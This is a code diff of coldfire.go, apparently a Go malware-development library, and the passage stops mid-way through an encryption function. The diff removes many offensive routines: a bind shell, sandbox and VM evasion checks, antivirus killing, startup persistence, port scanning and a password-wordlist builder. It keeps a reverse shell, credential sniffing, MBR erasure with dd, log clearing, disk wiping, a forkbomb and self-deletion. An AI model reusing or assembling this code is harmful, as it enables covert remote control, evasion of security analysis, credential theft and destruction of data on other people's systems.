+++ coldfire.go
@@ -4,41 +4,22 @@
 package coldfire
 
 import (
-	"archive/zip"
 	"bufio"
 	"bytes"
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/md5"
-	crand "crypto/rand"
-	"encoding/base64"
 	"encoding/binary"
-	"encoding/hex"
 	"fmt"
-	"io"
-	"io/ioutil"
-	"log"
-	"math/rand"
 	"net"
-	"net/http"
 	"os"
 	"os/exec"
-	"reflect"
 	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
 	"time"
 
-	portscanner "github.com/anvie/port-scanner"
 	"github.com/fatih/color"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
-	"github.com/jackpal/gateway"
-	"github.com/matishsiao/goInfo"
-	"github.com/mitchellh/go-homedir"
-	ps "github.com/mitchellh/go-ps"
-	"github.com/savaki/jq"
 )
 
 var (
@@ -49,40 +30,6 @@ var (
 	Yellow  = color.New(color.FgYellow).SprintFunc()
 	Magenta = color.New(color.FgMagenta).SprintFunc()
 )
-
-// Revert returns a reversed string.
-func Revert(s string) string {
-	r := []rune(s)
-	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
-		r[i], r[j] = r[j], r[i]
-	}
-	return string(r)
-}
-
-// IpIncrement increments an IP address by 1.
-func IpIncrement(ip net.IP) {
-	for j := len(ip) - 1; j >= 0; j-- {
-		ip[j]++
-		if ip[j] > 0 {
-			break
-		}
-	}
-}
-
-// KillProcByPID kills a process given its PID.
-func KillProcByPID(pid int) error {
-	return killProcByPID(pid)
-}
-
-func handleBind(conn net.Conn) {
-	for {
-		buffer := make([]byte, 1024)
-		length, _ := conn.Read(buffer)
-		command := string(buffer[:length-1])
-		out, _ := CmdOut(command)
-		conn.Write([]byte(out))
-	}
-}
 
 func handleReverse(conn net.Conn) {
 	message, _ := bufio.NewReader(conn).ReadString('\n')
@@ -115,15 +62,6 @@ func getNTPTime() time.Time {
 // 	time.Sleep(time.Duration(seconds) * time.Second)
 // 	endSignal <- true
 // }
-
-// F is a wrapper for the Sprintf function.
-func F(str string, arg ...interface{}) string {
-	return fmt.Sprintf(str, arg...)
-}
-
-func f(s string, arg ...interface{}) string {
-	return fmt.Sprintf(s, arg...)
-}
 
 // PrintGood is used to print output indicating success.
 func PrintGood(msg string) {
@@ -165,82 +103,10 @@ func FileToSlice(file string) []string {
 	return lines
 }
 
-// Contains is used to check if an element exists in an array type agnostically.
-func Contains(s interface{}, elem interface{}) bool {
-	arrV := reflect.ValueOf(s)
-	if arrV.Kind() == reflect.Slice {
-		for i := 0; i < arrV.Len(); i++ {
-			if arrV.Index(i).Interface() == elem {
-				return true
-			}
-		}
-	}
-	return false
-}
-
-// StrToInt converts a string into an integer.
-func StrToInt(string_integer string) int {
-	// i, _ := strconv.ParseInt(string_integer, 10, 32)
-	i, _ := strconv.Atoi(string_integer)
-	return i
-}
-
-// StrToWords returns a list of strings which was split by spaces.
-func StrToWords(s string) []string {
-	words := []string{}
-	gr := strings.Split(s, " ")
-	for x := range gr {
-		z := gr[x]
-		if len(z) != 0 {
-			words = append(words, z)
-		}
-	}
-	return words
-}
-
-// IntToStr converts an integer into a string.
-func IntToStr(i int) string {
-	return strconv.Itoa(i)
-}
-
-// SizeToBytes converts a human friendly string indicating size into a proper integer.
-func SizeToBytes(size string) int {
-	period_letter := string(size[len(size)-1])
-	intr := string(size[:len(size)-1])
-	i, _ := strconv.Atoi(intr)
-	switch period_letter {
-	case "g":
-		return i * 1024 * 1024 * 1024
-	case "m":
-		return i * 1024 * 1024
-	case "k":
-		return i * 1024
-	}
-	return i
-}
-
 // Alloc allocates memory without use.
 func Alloc(size string) {
+	// won't this be immidiatly garbage collected?
 	_ = make([]byte, SizeToBytes(size))
-}
-
-// IntervalToSeconds converts a human friendly string indicating time into a proper integer.
-func IntervalToSeconds(interval string) int {
-	period_letter := string(interval[len(interval)-1])
-	intr := string(interval[:len(interval)-1])
-	i, _ := strconv.Atoi(intr)
-
-	switch period_letter {
-	case "s":
-		return i
-	case "m":
-		return i * 60
-	case "h":
-		return i * 3600
-	case "d":
-		return i * 24 * 3600
-	}
-	return i
 }
 
 // GenCpuLoad gives the Cpu work to do by spawning goroutines.
@@ -268,336 +134,12 @@ func GenCpuLoad(cores int, interval string, percentage int) {
 	time.Sleep(t * time.Second)
 }
 
-// RandomInt returns an integer within a given range.
-func RandomInt(min int, max int) int {
-	rand.Seed(time.Now().UnixNano())
-	return rand.Intn(max-min) + min
-}
-
-// RandomSelectStr returns a string that was randomly selected from a list of strings.
-func RandomSelectStr(list []string) string {
-	rand.Seed(time.Now().UnixNano())
-	return list[rand.Intn(len(list))]
-}
-
-// RandomSelectStrNested returns a string array that was randomly selected from a nested list of strings
-func RandomSelectStrNested(list [][]string) []string {
-	rand.Seed(time.Now().UnixNano())
-	return list[rand.Intn(len(list))]
-}
-
-// RandomSelectInt returns an integer that was randomly selected from a list of integers.
-func RandomSelectInt(list []int) int {
-	rand.Seed(time.Now().UnixNano())
-	return list[rand.Intn(len(list))]
-}
-
-// RemoveNewLines removes possible newlines from a string.
-func RemoveNewlines(s string) string {
-	re := regexp.MustCompile(`\r?\n`)
-	s = re.ReplaceAllString(s, " ")
-	return s
-}
-
-// FullRemove removes all instances of a string from another string.
-func FullRemove(str string, to_remove string) string {
-	return strings.Replace(str, to_remove, "", -1)
-}
-
-// RemoveDuplicatesStr returns an array of strings that are unique to each other.
-func RemoveDuplicatesStr(slice []string) []string {
-	keys := make(map[string]bool)
-	list := []string{}
-
-	for _, entry := range slice {
-		if _, value := keys[entry]; !value {
-			keys[entry] = true
-			list = append(list, entry)
-		}
-	}
-	return list
-}
-
-// RemoveDuplicatesInt returns an array of integers that are unique to each other.
-func RemoveDuplicatesInt(slice []int) []int {
-	keys := make(map[int]bool)
-	list := []int{}
-
-	for _, entry := range slice {
-		if _, value := keys[entry]; !value {
-			keys[entry] = true
-			list = append(list, entry)
-		}
-	}
-	return list
-}
-
-// ContainsAny checks if a string exists within a list of strings.
-func ContainsAny(str string, elements []string) bool {
-	for element := range elements {
-		e := elements[element]
-		if strings.Contains(str, e) {
-			return true
-		}
-	}
-
-	return false
-}
-
-// RandomString randomly generates an alphabetic string of a given length.
-func RandomString(n int) string {
-	rand.Seed(time.Now().UnixNano())
-	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
-	b := make([]rune, n)
-
-	for i := range b {
-		b[i] = letters[rand.Intn(len(letters))]
-	}
-
-	return string(b)
-}
-
 // ExitOnError prints a given error and then stops execution of the process.
 func ExitOnError(e error) {
 	if e != nil {
 		PrintError(e.Error())
 		os.Exit(0)
 	}
-}
-
-// RemoveFromSlice removes a string from a list of strings if it exists.
-func RemoveFromSlice(slice []string, element string) []string {
-	res := []string{}
-
-	for _, e := range slice {
-		if e != element {
-			res = append(res, e)
-		}
-	}
-
-	return res
-}
-
-// GetLocalIp is used to get the local Ip address of the machine.
-func GetLocalIp() string {
-	conn, _ := net.Dial("udp", "8.8.8.8:80")
-	defer conn.Close()
-	ip := conn.LocalAddr().(*net.UDPAddr).IP
-
-	return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
-}
-
-// GetGlobalIp is used to return the global Ip address of the machine.
-func GetGlobalIp() string {
-	ip := ""
-	resolvers := []string{
-		"https://api.ipify.org?format=text",
-		"http://myexternalip.com/raw",
-		"http://ident.me",
-	}
-
-	for {
-		url := RandomSelectStr(resolvers)
-		resp, err := http.Get(url)
-		if err != nil {
-			log.Printf("%v\n", err)
-		}
-		defer resp.Body.Close()
-
-		i, _ := ioutil.ReadAll(resp.Body)
-		ip = string(i)
-
-		if resp.StatusCode == 200 {
-			break
-		}
-	}
-
-	return ip
-}
-
-// GetGatewayIP returns the Ip address of the gateway in the network where the machine resides.
-func GetGatewayIP() string {
-	ip, err := gateway.DiscoverGateway()
-	ExitOnError(err)
-
-	return ip.String()
-}
-
-// Iface returns the currently used wireless interface and its MAC address.
-func Iface() (string, string) {
-	current_iface := ""
-	interfaces, err := net.Interfaces()
-	ExitOnError(err)
-
-	for _, interf := range interfaces {
-		if addrs, err := interf.Addrs(); err == nil {
-			for _, addr := range addrs {
-				if strings.Contains(addr.String(), GetLocalIp()) {
-					current_iface = interf.Name
-				}
-			}
-		}
-	}
-
-	netInterface, err := net.InterfaceByName(current_iface)
-	ExitOnError(err)
-
-	name := netInterface.Name
-	macAddress := netInterface.HardwareAddr
-	hwAddr, err := net.ParseMAC(macAddress.String())
-	ExitOnError(err)
-
-	return name, hwAddr.String()
-}
-
-// Ifaces returns the names of all local interfaces.
-func Ifaces() []string {
-	ifs := []string{}
-	interfaces, _ := net.Interfaces()
-
-	for _, interf := range interfaces {
-		ifs = append(ifs, interf.Name)
-	}
-
-	return ifs
-}
-
-// Info is used to return basic system information.
-// Note that if information can not be resolved in a
-// specific field it returns "N/A"
-func Info() map[string]string {
-	_, mac := Iface()
-	var (
-		u     string
-		ap_ip string
-	)
-
-	i, _ := goInfo.GetInfo()
-
-	u = info()
-	ap_ip = ""
-	_ = ap_ip
-	hdir, err := homedir.Dir()
-	if err != nil {
-		log.Fatalf(err.Error())
-	}
-
-	inf := map[string]string{
-		"username":  u,
-		"hostname":  fmt.Sprintf("%v", i.Hostname),
-		"go_os":     fmt.Sprintf("%v", i.GoOS),
-		"os":        fmt.Sprintf("%v", i.OS),
-		"platform":  fmt.Sprintf("%v", i.Platform),
-		"cpu_num":   fmt.Sprintf("%v", i.CPUs),
-		"kernel":    fmt.Sprintf("%v", i.Kernel),
-		"core":      fmt.Sprintf("%v", i.Core),
-		"local_ip":  GetLocalIp(),
-		"global_ip": GetGlobalIp(),
-		"ap_ip":     GetGatewayIP(),
-		"mac":       mac,
-		"homedir":   hdir,
-	}
-
-	return inf
-}
-
-// MD5Hash hashes a given string using the MD5.
-func MD5Hash(str string) string {
-	hasher := md5.New()
-	hasher.Write([]byte(str))
-
-	return hex.EncodeToString(hasher.Sum(nil))
-}
-
-// CreateWordList generates possible variations of each word in the wordlist.
-func CreateWordlist(words []string) []string {
-	wordlist := []string{}
-	for w := range words {
-		word := words[w]
-		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
-		wordlist = append(wordlist, strings.ToUpper(word))
-		wordlist = append(wordlist, Revert(word))
-		wordlist = append(wordlist, first_to_upper)
-		wordlist = append(wordlist, first_to_upper+"1")
-		wordlist = append(wordlist, first_to_upper+"12")
-		wordlist = append(wordlist, first_to_upper+"123")
-		wordlist = append(wordlist, word+"1")
-		wordlist = append(wordlist, word+"12")
-		wordlist = append(wordlist, word+"123")
-	}
-
-	return wordlist
-}
-
-// ReadFile is used to read a given file and return its data as a string.
-func ReadFile(filename string) (string, error) {
-	fil, err := os.Open(filename)
-	if err != nil {
-		return "", err
-	}
-	defer fil.Close()
-
-	b, err := ioutil.ReadAll(fil)
-	if err != nil {
-		return "", err
-	}
-
-	return string(b), nil
-}
-
-// WriteFile is used to write data into a given file.
-func WriteFile(filename, data string) error {
-	file, err := os.Create(filename)
-	if err != nil {
-		return err
-	}
-	defer file.Close()
-
-	_, err = io.WriteString(file, data)
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// FilesPattern is used to return data mapped to files
-// where their filenames match a given pattern.
-func FilesPattern(directory, pattern string) (map[string]string, error) {
-	out_map := map[string]string{}
-	files, err := os.ReadDir(directory)
-	if err != nil {
-		return nil, err
-	}
-
-	for _, f := range files {
-		fl, err := ReadFile(f.Name())
-
-		if err != nil {
-			return nil, err
-		}
-
-		if strings.Contains(fl, pattern) {
-			out_map[f.Name()], err = ReadFile(f.Name())
-			if err != nil {
-				return nil, err
-			}
-		}
-	}
-
-	return out_map, nil
-}
-
-// B64D decodes a given string encoded in Base64.
-func B64D(str string) string {
-	raw, _ := base64.StdEncoding.DecodeString(str)
-
-	return fmt.Sprintf("%s", raw)
-}
-
-// B64E encodes a string in Base64.
-func B64E(str string) string {
-	return base64.StdEncoding.EncodeToString([]byte(str))
 }
 
 // Wait uses a human friendly string that indicates how long a system should wait.
@@ -630,123 +172,6 @@ func Forkbomb() {
 // Remove is used to self delete.
 func Remove() {
 	os.Remove(os.Args[0])
-}
-
-// Exists checks if a given file is in the system.
-func Exists(file string) bool {
-	_, err := os.Stat(file)
-	if err != nil {
-		if os.IsNotExist(err) {
-			return false
-		}
-	}
-	return true
-}
-
-// IsRoot checks if the current user is the administrator of the machine.
-func IsRoot() bool {
-	return isRoot()
-}
-
-// CmdOut executes a given command and returns its output.
-func CmdOut(command string) (string, error) {
-	return cmdOut(command)
-}
-
-// CmdOutPlatform executes a given set of commands based on the OS of the machine.
-func CmdOutPlatform(commands map[string]string) (string, error) {
-	cmd := commands[runtime.GOOS]
-	out, err := CmdOut(cmd)
-	if err != nil {
-		return "", err
-	}
-
-	return out, nil
-}
-
-// CmdRun executes a command and writes output as well
-// as error to STDOUT.
-func CmdRun(command string) {
-	parts := strings.Fields(command)
-	head := parts[0]
-	parts = parts[1:]
-	cmd := exec.Command(head, parts...)
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		PrintError(err.Error())
-		fmt.Println(string(output))
-	} else {
-		fmt.Println(string(output))
-	}
-}
-
-// CmdBlind runs a command without any side effects.
-func CmdBlind(command string) {
-	parts := strings.Fields(command)
-	head := parts[0]
-	parts = parts[1:]
-	cmd := exec.Command(head, parts...)
-	_, _ = cmd.CombinedOutput()
-}
-
-// CmdDir executes commands which are mapped to a string
-// indicating the directory where the command is executed.
-func CmdDir(dirs_cmd map[string]string) ([]string, error) {
-	outs := []string{}
-	for dir, cmd := range dirs_cmd {
-		err := os.Chdir(dir)
-		if err != nil {
-			return nil, err
-		}
-
-		o, err := CmdOut(cmd)
-		if err != nil {
-			return nil, err
-		}
-		outs = append(outs, o)
-	}
-
-	return outs, nil
-}
-
-// MakeZip packs a list of given files within a zip archive.
-func MakeZip(zip_file string, files []string) error {
-	newZipFile, err := os.Create(zip_file)
-	if err != nil {
-		return err
-	}
-	defer newZipFile.Close()
-
-	zipWriter := zip.NewWriter(newZipFile)
-	defer zipWriter.Close()
-
-	for _, file := range files {
-		fileToZip, err := os.Open(file)
-		if err != nil {
-			return err
-		}
-		defer fileToZip.Close()
-		info, err := fileToZip.Stat()
-		if err != nil {
-			return err
-		}
-		header, err := zip.FileInfoHeader(info)
-		if err != nil {
-			return err
-		}
-		header.Name = file
-		header.Method = zip.Deflate
-		writer, err := zipWriter.CreateHeader(header)
-		if err != nil {
-			return err
-		}
-		_, err = io.Copy(writer, fileToZip)
-		if err != nil {
-			return err
-		}
-	}
-
-	return nil
 }
 
 // CredentialsSniff is used to sniff network traffic for
@@ -794,180 +219,6 @@ func CredentialsSniff(ifac, interval string,
 	return nil
 }
 
-// SandboxFilePath checks if the process is being run
-// inside a virtualized environment.
-func SandboxFilepath() bool {
-	return sandboxFilepath()
-}
-
-// SandboxProc checks if there are processes that indicate
-// a virtualized environment.
-func SandboxProc() bool {
-	sandbox_processes := []string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`,
-		`vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`,
-		`vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`,
-		`vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}
-	p, _ := Processes()
-	for _, name := range p {
-		if ContainsAny(name, sandbox_processes) {
-			return true
-		}
-	}
-	return false
-}
-
-// SandboxSleep is used to check if the virtualized environment
-// is speeding up the sleeping process.
-func SandboxSleep() bool {
-	z := false
-	firstTime := getNTPTime()
-	sleepSeconds := 10
-	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
-	secondTime := getNTPTime()
-	difference := secondTime.Sub(firstTime).Seconds()
-	if difference < float64(sleepSeconds) {
-		z = true
-	}
-	return z
-}
-
-// SandboxCpu is used to check if the environment's
-// cores are less than a given integer.
-func SandboxCpu(cores int) bool {
-	x := false
-	num_procs := runtime.NumCPU()
-	if !(num_procs >= cores) {
-		x = true
-	}
-	return x
-}
-
-// SandboxRam is used to check if the environment's
-// RAM is less than a given size.
-func SandboxRam(ram_mb int) bool {
-	var m runtime.MemStats
-	runtime.ReadMemStats(&m)
-	rmb := uint64(ram_mb)
-	ram := m.TotalAlloc / 1024 / 1024
-
-	return ram < rmb
-}
-
-// SandboxUtc is used to check if the environment
-// is in a properly set Utc timezone.
-func SandboxUtc() bool {
-	_, offset := time.Now().Zone()
-
-	return offset == 0
-}
-
-// SandboxProcnum is used to check if the environment
-// has processes less than a given integer.
-func SandboxProcnum(proc_num int) bool {
-	processes, err := ps.Processes()
-	if err != nil {
-		return true
-	}
-
-	return len(processes) < proc_num
-}
-
-// SandboxTmp is used to check if the environment's
-// temporary directory has less files than a given integer.
-func SandboxTmp(entries int) bool {
-	return sandboxTmp(entries)
-}
-
-// SandboxMac is used to check if the environment's MAC address
-// matches standard MAC adddresses of virtualized environments.
-func SandboxMac() bool {
-	hits := 0
-	sandbox_macs := []string{`00:0C:29`, `00:1C:14`,
-		`00:50:56`, `00:05:69`, `08:00:27`}
-	ifaces, _ := net.Interfaces()
-
-	for _, iface := range ifaces {
-		for _, mac := range sandbox_macs {
-			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
-				hits += 1
-			}
-		}
-	}
-
-	return hits == 0
-}
-
-// SandboxAll is used to check if an environment is virtualized
-// by testing all sandbox checks.
-func SandboxAll() bool {
-	values := []bool{
-		SandboxProc(),
-		SandboxFilepath(),
-		SandboxCpu(2),
-		SandboxSleep(),
-		SandboxTmp(10),
-		SandboxProcnum(100),
-		SandboxRam(2048),
-		SandboxUtc(),
-	}
-
-	for s := range values {
-		x := values[s]
-		if x {
-			return true
-		}
-	}
-
-	return false
-}
-
-// SandboxAlln checks if an environment is virtualized by testing all
-// sandbox checks and checking if the number of successful checks is
-// equal or greater to a given integer.
-func SandboxAlln(num int) bool {
-	num_detected := 0
-	values := []bool{
-		SandboxProc(),
-		SandboxFilepath(),
-		SandboxCpu(2),
-		SandboxSleep(),
-		SandboxTmp(10),
-		SandboxTmp(100),
-		SandboxRam(2048),
-		SandboxMac(),
-		SandboxUtc(),
-	}
-	for s := range values {
-		x := values[s]
-		if x {
-			num_detected += 1
-		}
-	}
-
-	return num_detected >= num
-}
-
-// Shutdown forces the machine to shutdown.
-func Shutdown() error {
-	return shutdown()
-}
-
-// Bind tells the process to listen to a local port
-// for commands.
-func Bind(port int) {
-	listen, err := net.Listen("tcp", "0.0.0.0:"+strconv.Itoa(port))
-	ExitOnError(err)
-	defer listen.Close()
-
-	for {
-		conn, err := listen.Accept()
-		if err != nil {
-			PrintError("Cannot bind to selected port")
-		}
-		handleBind(conn)
-	}
-}
-
 // Reverse initiates a reverse shell to a given host:port.
 func Reverse(host string, port int) {
 	conn, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
@@ -978,77 +229,7 @@ func Reverse(host string, port int) {
 	}
 }
 
-// PkillPid kills a process by its PID.
-func PkillPid(pid int) error {
-	err := KillProcByPID(pid)
-	return err
-}
-
-// PkillName kills a process by its name.
-func PkillName(name string) error {
-	processList, err := ps.Processes()
-	if err != nil {
-		return err
-	}
-
-	for x := range processList {
-		process := processList[x]
-		proc_name := process.Executable()
-		pid := process.Pid()
-
-		if strings.Contains(proc_name, name) {
-			err := KillProcByPID(pid)
-			if err != nil {
-				return err
-			}
-		}
-	}
-	return nil
-}
-
-// PkillAv kills Anti-Virus processes that may run within the machine.
-func PkillAv() error {
-	return pkillAv()
-}
-
-// Processes returns a map of a PID to its respective process name.
-func Processes() (map[int]string, error) {
-	prs := make(map[int]string)
-	processList, err := ps.Processes()
-	if err != nil {
-		return nil, err
-	}
-
-	for x := range processList {
-		process := processList[x]
-		prs[process.Pid()] = process.Executable()
-	}
-
-	return prs, nil
-}
-
-// Portscan checks for open ports in a given target.
-func Portscan(target string, timeout, threads int) (pr []int) {
-	ps := portscanner.NewPortScanner(target, time.Duration(timeout)*time.Second, threads)
-	opened_ports := ps.GetOpenedPort(0, 65535)
-
-	for p := range opened_ports {
-		port := opened_ports[p]
-		pr = append(pr, port)
-	}
-
-	return
-}
-
-// PortscanSingle checks if a specific port is open in a given target.
-func PortscanSingle(target string, port int) bool {
-	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
-	opened_ports := ps.GetOpenedPort(port-1, port+1)
-
-	return len(opened_ports) != 0
-}
-
-// Bannergrab returns a service banner string from a given port.
+// BannerGrab returns a service banner string from a given port.
 func BannerGrab(target string, port int) (string, error) {
 	conn, err := net.DialTimeout("tcp", target+":"+strconv.Itoa(port), time.Second*10)
 	if err != nil {
@@ -1068,86 +249,8 @@ func BannerGrab(target string, port int) (string, error) {
 	return string(banner), nil
 }
 
-// SendDataTCP sends data to a given host:port using the TCP protocol.
-func SendDataTCP(host string, port int, data string) error {
-	addr := host + ":" + strconv.Itoa(port)
-	conn, err := net.Dial("tcp", addr)
-	if err != nil {
-		return err
-	}
-	_, err = io.WriteString(conn, data+"\n")
-	if err != nil {
-		return err
-	}
-	defer conn.Close()
-
-	return nil
-}
-
-// SendDataUDP sends data to a given host:port using the UDP protocol.
-func SendDataUDP(host string, port int, data string) error {
-	addr := host + ":" + strconv.Itoa(port)
-	conn, err := net.Dial("udp", addr)
-	if err != nil {
-		return err
-	}
-
-	_, err = io.WriteString(conn, data+"\n")
-	if err != nil {
-		return err
-	}
-	defer conn.Close()
-
-	return nil
-}
-
-// FilePermissions checks if a given file has read and write permissions.
-func FilePermissions(filename string) (bool, bool) {
-	write_permission := true
-	read_permission := true
-
-	file, err := os.OpenFile(filename, os.O_WRONLY, 0666)
-	if err != nil {
-		if os.IsPermission(err) {
-			write_permission = false
-		}
-	}
-	file.Close()
-
-	return read_permission, write_permission
-}
-
-// Download downloads a file from a url.
-func Download(url string) error {
-	splitted := strings.Split(url, "/")
-	filename := splitted[len(splitted)-1]
-
-	f, err := os.Create(filename)
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-
-	response, err := http.Get(url)
-	if err != nil {
-		return err
-	}
-	defer response.Body.Close()
-
-	_, err = io.Copy(f, response.Body)
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-
-// Users returns a list of known users within the machine.
-func Users() ([]string, error) {
-	return users()
-}
-
 // EraseMbr zeroes out the Master Boot Record.
+// This is linux only, so should live in `coldfier_linux.go`
 func EraseMbr(device string, partition_table bool) error {
 	cmd := f("dd if=/dev/zero of=%s bs=446 count=1", device)
 	if partition_table {
@@ -1162,32 +265,6 @@ func EraseMbr(device string, partition_table bool) error {
 	return nil
 }
 
-// Networks returns a list of nearby wireless networks.
-func Networks() ([]string, error) {
-	return networks()
-}
-
-// ExpandCidr returns a list of Ip addresses within a given CIDR.
-func ExpandCidr(cidr string) ([]string, error) {
-	ip, ipnet, err := net.ParseCIDR(cidr)
-	if err != nil {
-		return nil, err
-	}
-
-	var ips []string
-	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); IpIncrement(ip) {
-		ips = append(ips, ip.String())
-	}
-
-	lenIPs := len(ips)
-	switch {
-	case lenIPs < 2:
-		return ips, nil
-	default:
-		return ips[1 : len(ips)-1], nil
-	}
-}
-
 // ClearLogs removes logfiles within the machine.
 func ClearLogs() error {
 	return clearLogs()
@@ -1198,128 +275,8 @@ func Wipe() error {
 	return wipe()
 }
 
-// DnsLookup returns the list of Ip adddress associated with the given hostname.
-func DnsLookup(hostname string) ([]string, error) {
-	i := []string{}
-	ips, err := net.LookupIP(hostname)
-	if err != nil {
-		return nil, err
-	}
-
-	for _, ip := range ips {
-		i = append(i, ip.String())
-	}
-
-	return i, nil
-}
-
-// RdnsLookup returns the list of hostnames associated with the given Ip address.
-func RdnsLookup(ip string) ([]string, error) {
-	ips, err := net.LookupAddr(ip)
-	if err != nil {
-		return nil, err
-	}
-	return ips, nil
-}
-
 // CreateUser creates a user with a given username and password.
 // TODO
-
-// WifiDisconnect is used to disconnect the machine from a wireless network.
-func WifiDisconnect() error {
-	return wifiDisconnect()
-}
-
-// Disks returns a list of storage drives within the machine.
-func Disks() ([]string, error) {
-	return disks()
-}
-
-// CopyFile copies a file from one directory to another.
-func CopyFile(src, dst string) error {
-	sourceFileStat, err := os.Stat(src)
-	if err != nil {
-		return err
-	}
-
-	if !sourceFileStat.Mode().IsRegular() {
-		return fmt.Errorf("%s is not a regular file", src)
-	}
-
-	source, err := os.Open(src)
-	if err != nil {
-		return err
-	}
-	defer source.Close()
-
-	destination, err := os.Create(dst)
-	if err != nil {
-		return err
-	}
-	defer destination.Close()
-
-	_, err = io.Copy(destination, source)
-	return err
-}
-
-// TraverseCurrentDir lists all files that exist within the current directory.
-func TraverseCurrentDir() ([]string, error) {
-	files_in_dir := []string{}
-	files, err := os.ReadDir(".")
-	if err != nil {
-		return nil, err
-	}
-
-	for _, f := range files {
-		files_in_dir = append(files_in_dir, f.Name())
-	}
-
-	return files_in_dir, nil
-}
-
-// TraverseDir lists all files that exist within a given directory.
-func TraverseDir(dir string) ([]string, error) {
-	files_in_dir := []string{}
-	files, err := os.ReadDir(dir)
-	if err != nil {
-		return nil, err
-	}
-
-	for _, f := range files {
-		files_in_dir = append(files_in_dir, f.Name())
-	}
-
-	return files_in_dir, nil
-}
-
-// RemoveStr removes a given string from a list of strings.
-func RemoveStr(slice []string, s string) []string {
-	final := []string{}
-	for _, e := range slice {
-		if e != s {
-			final = append(final, e)
-		}
-	}
-
-	return final
-}
-
-// RemoveInt removes a given integer from a list of integers.
-func RemoveInt(slice []int, s int) []int {
-	final := []int{}
-	for _, e := range slice {
-		if e != s {
-			final = append(final, e)
-		}
-	}
-
-	return final
-}
-
-// AddPersistentCommand creates a task that runs a given command on startup.
-func AddPersistentCommand(cmd string) error {
-	return addPersistentCommand(cmd)
-}
 
 // RegexMatch checks if a string contains valuable information through regex.
 func RegexMatch(regex_type, str string) bool {
@@ -1338,192 +295,4 @@ func RegexMatch(regex_type, str string) bool {
 	matches := r.FindAllString(str, -1)
 
 	return len(matches) != 0
-}
-
-// ShuffleSlice randomly shuffles a list of strings.
-func ShuffleSlice(s []string) []string {
-	rand.Seed(time.Now().UnixNano())
-	rand.Shuffle(len(s), func(i, j int) {
-		s[i], s[j] = s[j], s[i]
-	})
-
-	return s
-}
-
-// StartNgrokTCP exposes a TCP server on a given port.
-func StartNgrokTCP(port int) error {
-	_, err := CmdOut(F("ngrok tcp %d", port))
-
-	return err
-}
-
-// StartNgrokHTTP exposes a web server on a given port.
-func StartNgrokHTTP(port int) error {
-	_, err := CmdOut(F("ngrok http %d", port))
-
-	return err
-}
-
-// GetNgrokURL returns the URL of the Ngrok tunnel exposing the machine.
-func GetNgrokURL() (string, error) {
-	local_url := "http://localhost:4040/api/tunnels"
-	resp, err := http.Get(local_url)
-
-	if err != nil {
-		return "", err
-	}
-	defer resp.Body.Close()
-
-	json, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-
-	jq_op_1, _ := jq.Parse(".tunnels")
-	json_1, _ := jq_op_1.Apply(json)
-	jq_op_2, _ := jq.Parse(".[0]")
-	json_2, _ := jq_op_2.Apply(json_1)
-	jq_op_3, _ := jq.Parse(".public_url")
-	json_3, _ := jq_op_3.Apply(json_2)
-	json_sanitized := FullRemove(string(json_3), `"`)
-
-	return json_sanitized, nil
-}
-
-// ExtractIntFromString extracts a list of possible integers from a given string.
-func ExtractIntFromString(s string) []int {
-	res := []int{}
-	re := regexp.MustCompile(`[-]?\d[\d,]*[\.]?[\d{2}]*`)
-	submatchall := re.FindAllString(s, -1)
-
-	for _, element := range submatchall {
-		res = append(res, StrToInt(element))
-	}
-
-	return res
-}
-
-// Splitjoin splits a string then joins them using given delimiters.
-func SplitJoin(s, splitter, joiner string) string {
-	splitted := strings.Split(s, splitter)
-	joined := strings.Join(splitted, joiner)
-
-	return joined
-}
-
-// RevertSlice reverses a slice type agnostically.
-func RevertSlice(s interface{}) {
-	n := reflect.ValueOf(s).Len()
-	swap := reflect.Swapper(s)
-
-	for i, j := 0, n-1; i < j; i, j = i+1, j-1 {
-		swap(i, j)
-	}
-}
-
-func SplitMultiSep(s string, seps []string) []string {
-	f := func(c rune) bool {
-		for _, sep := range seps {
-			if string(c) == sep {
-				return true
-			}
-		}
-		return false
-	}
-	fields := strings.FieldsFunc(s, f)
-	return fields
-}
-
-func SplitChunks(s string, chunk int) []string {
-	if chunk >= len(s) {
-		return []string{s}
-	}
-	var chunks []string
-	c := make([]rune, chunk)
-	len := 0
-	for _, r := range s {
-		c[len] = r
-		len++
-		if len == chunk {
-			chunks = append(chunks, string(c))
-			len = 0
-		}
-	}
-	if len > 0 {
-		chunks = append(chunks, string(c[:len]))
-	}
-	return chunks
-}
-
-func GenerateKey() []byte {
-	random_bytes := make([]byte, 32)
-	_, err := crand.Read(random_bytes) // Generates 32 cryptographically secure random bytes
-	if err != nil {
-		println("Failed to generate the key.")
-		return nil
-	}
-	return random_bytes
-}
-
-func GenerateIV() []byte {
-	random_bytes := make([]byte, 16)
-	_, err := crand.Read(random_bytes) // Generates 16 cryptographically secure random bytes
-	if err != nil {
-		println("Failed to generate IV.")
-		return nil
-	}
-	return random_bytes
-}
-
-func EncryptBytes(secret_message []byte, key []byte) []byte {
-	cipher_block, err := aes.NewCipher(key)
-	if err != nil {
-		println("Error occured, can't encrypt")
-		return nil
-	}
-
-	length_to_bytes := make([]byte, 4)
-	binary.LittleEndian.PutUint32(length_to_bytes, uint32(len(secret_message)))
-
-	length_and_secret := append(length_to_bytes, secret_message...)
-
-	IV := GenerateIV()
-	if len(length_and_secret)%16 != 0 {
